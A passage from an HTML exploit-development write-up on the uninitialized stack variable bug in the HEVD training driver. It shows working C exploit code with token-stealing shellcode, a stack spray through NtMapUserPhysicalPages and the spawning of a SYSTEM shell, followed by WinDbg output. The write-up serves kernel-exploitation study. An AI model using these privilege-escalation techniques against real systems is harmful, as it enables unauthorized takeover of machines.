        <span class="s">"</span><span class="se">\x2D\xB8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x39\x90\xB4\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x75\xED</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8B\x90\xF8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x89\x91\xF8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x61</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xC3</span><span class="s">"</span>
        <span class="p">);</span>

    <span class="c1">// Allocate a RWX buffer the size of our shellcode</span>
    <span class="n">LPVOID</span> <span class="n">Shellcode_Addr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span>
        <span class="k">sizeof</span><span class="p">(</span><span class="n">Shellcode</span><span class="p">),</span>
        <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span>
        <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="c1">// Copying our shellcode buffer into our RWX buffer</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Allocating RWX shellcode at: %X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">Shellcode_Addr</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">Shellcode_Addr</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Shellcode</span><span class="p">));</span>

    <span class="c1">// This var is going to be a pointer to the address of Shellcode_Addr, this will end up being the value we spray on the stack</span>
    <span class="n">LPVOID</span> <span class="n">Spray_Address</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Shellcode_Addr</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Our address to spray on the stack: %X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">Spray_Address</span><span class="p">);</span>

    <span class="c1">// This var will be used as our BaseAddress in our NtMapPhysicalPages API call</span>
    <span class="kt">int</span> <span class="n">Zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// We will typecast this to a PBYTE and reference its address when calling NtMapPhysicalPages</span>
    <span class="kt">char</span> <span class="n">Page_Frame_Numbers</span><span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

    <span class="c1">// This for loop will take our 4096 character array and fill it with the Spray_Address value</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">((</span><span class="n">Page_Frame_Numbers</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)),</span> <span class="n">Spray_Address</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Calling the API finally, thanks again, tekwizz</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Spraying stack and triggering vulnerability...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">NtMapUserPhysicalPages</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Zero</span><span class="p">,</span>
        <span class="mi">1024</span><span class="p">,</span>
        <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Page_Frame_Numbers</span><span class="p">);</span>

    <span class="n">DWORD</span> <span class="n">Dummy_Bytes</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// Trigger bug</span>
    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">HEVD</span><span class="p">,</span>
        <span class="mh">0x22202F</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">Input_Buffer</span><span class="p">,</span>
        <span class="k">sizeof</span><span class="p">(</span><span class="n">Input_Buffer</span><span class="p">),</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">Dummy_Bytes</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Spawning nt/authority system cmd.exe shell...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">Spawn_Shell</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>The main idea is very simple: if we provide something else except for 0xBAD0B0B0, we’ll not set <code class="language-plaintext highlighter-rouge">UninitializedStackVariable.Callback = UninitializedStackVariableObjectCallback;</code> and Callback will be called not initialized from the stack (that means something that is aligned in the stack, some junk)</p>

<p>And we spray the stack with out address so out shellcode will be called as a callback.</p>

<p>Don’t know why, but if we put the breakpoint on the start of the function, exploit wouldn’t work</p>

<p>We should delete it and leave just <code class="language-plaintext highlighter-rouge">bp HEVD!TriggerUninitializedStackVariable+94</code></p>

<p>In this case we’ll see:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="mi">9758</span><span class="nx">bf8e</span> <span class="nx">ff95f8feffff</span>    <span class="nx">call</span>    <span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">ebp</span><span class="o">-</span><span class="mi">108</span><span class="nx">h</span><span class="p">]</span> <span class="nx">ss</span><span class="p">:</span><span class="mi">0010</span><span class="p">:</span><span class="nx">ac9c59ac</span><span class="o">=</span><span class="mi">001</span><span class="nx">d0000</span>
<span class="p">...</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">thread</span>
<span class="p">...</span>
<span class="nx">Stack</span> <span class="nx">Init</span> <span class="nx">ac9c5ed0</span>
<span class="p">...</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="p">?</span><span class="nx">ac9c5ed0</span><span class="o">-</span><span class="mh">0x524</span>
<span class="nx">Evaluate</span> <span class="nx">expression</span><span class="p">:</span> <span class="o">-</span><span class="mi">1399039572</span> <span class="o">=</span> 

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="nx">ac9c59ac</span> <span class="nx">L1</span>
<span class="nx">ac9c59ac</span>  <span class="mi">001</span><span class="nx">d0000</span>

<span class="nx">We</span> <span class="nx">see</span> <span class="nx">out</span> <span class="nx">address</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">shellcode</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">u</span> <span class="mi">001</span><span class="nx">d0000</span>
<span class="mi">001</span><span class="nx">d0000</span> <span class="mi">60</span>              <span class="nx">pushad</span>
<span class="mi">001</span><span class="nx">d0001</span> <span class="mi">64</span><span class="nx">a124010000</span>    <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="nx">fs</span><span class="p">:[</span><span class="mi">00000124</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">001</span><span class="nx">d0007</span> <span class="mi">8</span><span class="nx">b4050</span>          <span class="nx">mov</span>     <span class="nx">eax</span><span class="p">,</span><span class="nx">dword</span> <span class="nx">ptr</span> <span class="p">[</span><span class="nx">eax</span><span class="o">+</span><span class="mi">50</span><span class="nx">h</span><span class="p">]</span>
<span class="mi">001</span><span class="nx">d000a</span> <span class="mi">89</span><span class="nx">c1</span>            <span class="nx">mov</span>     <span class="nx">ecx</span><span class="p">,</span><span class="nx">eax</span>
</code></pre></div></div>

<p><img src="/assets/post_images/13.png" alt="Proof_" /></p>

</article>
      </section>
    </div>
  </div>
</body>

</html>
